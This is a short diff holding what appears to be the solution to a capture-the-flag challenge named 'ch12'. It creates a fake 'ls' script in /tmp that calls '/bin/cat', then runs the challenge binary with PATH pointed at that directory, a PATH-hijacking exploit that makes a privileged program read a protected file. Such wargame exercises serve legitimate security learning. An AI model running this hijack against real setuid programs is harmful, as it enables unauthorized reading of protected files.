@@ -1,1 +1,6 @@
-...
+mkdir /tmp/ch12
+vim /tmp/ch12/ls
+	#!/bin/sh
+	/bin/cat $2
+chmod +x /tmp/ch12/ls
+env PATH='/tmp/ch12' ./ch12
